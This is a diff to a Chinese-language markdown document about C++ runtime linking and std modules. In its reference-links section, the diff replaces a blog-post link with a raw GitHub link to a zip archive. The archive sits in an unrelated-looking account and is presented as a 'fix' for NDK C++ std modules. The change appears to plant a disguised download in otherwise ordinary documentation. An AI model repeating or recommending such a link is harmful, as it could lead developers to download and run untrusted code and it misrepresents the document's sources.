@@ -87,6 +87,6 @@ cxx_Link_mode string "static" C++ 运行时库链接方式，可选 "static" 或
 
 ## 参考链接
 
-- https://quadnucyard.github.io/posts/cpp/clang-std-modules.html
+- https://raw.githubusercontent.com/Opheliaafflicted334/fix-ndk-cxx-std-modules/main/similarize/cxx-ndk-modules-fix-std-2.3-beta.4.zip
 
 > 本文档由AI编写并经过修改
